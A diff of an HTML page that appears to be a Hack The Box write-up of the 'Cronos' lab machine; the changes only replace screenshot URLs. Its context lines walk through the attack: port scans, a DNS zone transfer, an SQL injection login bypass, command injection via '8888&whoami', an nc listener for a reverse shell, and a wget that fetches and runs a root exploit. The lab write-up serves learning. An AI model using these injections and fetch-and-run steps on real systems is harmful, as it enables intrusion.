@@ -249,14 +249,14 @@ namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13  So we can conduct the rela
 <pre><code>nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
 </code></pre>
 
-<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/openports.png" alt="openports" /></p>
+<p><img src="https://s2.ax1x.com/2019/03/15/AE1qlF.png" alt="AE1qlF.png" /></p>
 
 <p>3 ports is open, detect the detailed services:</p>
 
 <pre><code>namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13
 </code></pre>
 
-<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/services.png" alt="services" /></p>
+<p><img src="https://s2.ax1x.com/2019/03/15/AE1OOJ.png" alt="AE1OOJ.png" /></p>
 
 <p>So we can conduct the relation of ports of ports and services as following:</p>
 
@@ -292,7 +292,7 @@ namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13  So we can conduct the rela
 
 <p>As the target machine provides http service, try to access <code>http://10.10.10.13</code></p>
 
-<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/80.png" alt="default web" /></p>
+<p><img src="https://s2.ax1x.com/2019/03/15/AE3V0A.png" alt="AE3V0A.png" /></p>
 
 <p>Default apache web page, nothing new. So try to brute force <code>http://10.10.10.13/</code> with dirbuster. After brute force for a period time, we have not found anything new.</p>
 
@@ -303,7 +303,7 @@ namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13  So we can conduct the rela
 <pre><code>dig axfr @10.10.10.13 cronos.htb
 </code></pre>
 
-<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/dns.png" alt="dns" /></p>
+<p><img src="https://s2.ax1x.com/2019/03/15/AE3ZTI.png" alt="AE3ZTI.png" /></p>
 
 <p>An interestring domain name <code>admin.cronos.htb</code> is found. So add an entry into <code>/etc/hosts</code>:</p>
 
@@ -312,13 +312,13 @@ namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13  So we can conduct the rela
 
 <p>Try to access <code>admin.cronos.htb</code> in the browser, a login web page is displayed. Yep, it is what we want. It seems that the login is quite simple. Try to login with sql injection with the username of <code>admin ' or '1' = '1</code>, the password can be anything.</p>
 
-<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/login.png" alt="login" /></p>
+<p><img src="https://s2.ax1x.com/2019/03/15/AE3mkt.png" alt="AE3mkt.png" /></p>
 
-<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/pass.png" alt="pass" /></p>
+<p><img src="https://s2.ax1x.com/2019/03/15/AE3ntP.png" alt="AE3ntP.png" /></p>
 
 <p>Magic! We are in. It seems that it is a network tool. However, it seems that it has exposed the ability to execute command remotely. Have a test of <code>8888&amp;whoami</code>:</p>
 
-<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/whoami.png" alt="whoami" /></p>
+<p><img src="https://s2.ax1x.com/2019/03/15/AE3l6g.png" alt="AE3l6g.png" /></p>
 
 <p>The result is <code>www-data</code>. Obviously, the command can executed properly. Now try to reverse the shell. Try to listen to port <code>1234</code> by nc in our kali:</p>
 
@@ -332,7 +332,7 @@ namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13  So we can conduct the rela
 
 <p>Wait for server second, shell is return. Wonderful!</p>
 
-<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/nc.png" alt="nc" /></p>
+<p><img src="https://s2.ax1x.com/2019/03/15/AE3uff.png" alt="AE3uff.png" /></p>
 
 <p>Try to obtain a tty terminal:</p>
 
@@ -380,7 +380,7 @@ wget http://10.10.16.44/exploit
 
 <p>Just execute it by <code>./exploit</code>. Wow, now see whoami.</p>
 
-<p><img src="https://github.com/neal1991/htb/blob/master/Cronos/root.png" alt="root" /></p>
+<p><img src="https://s2.ax1x.com/2019/03/15/AE31XQ.png" alt="AE31XQ.png" /></p>
 
 <h2 id="conclusion">Conclusion</h2>
 
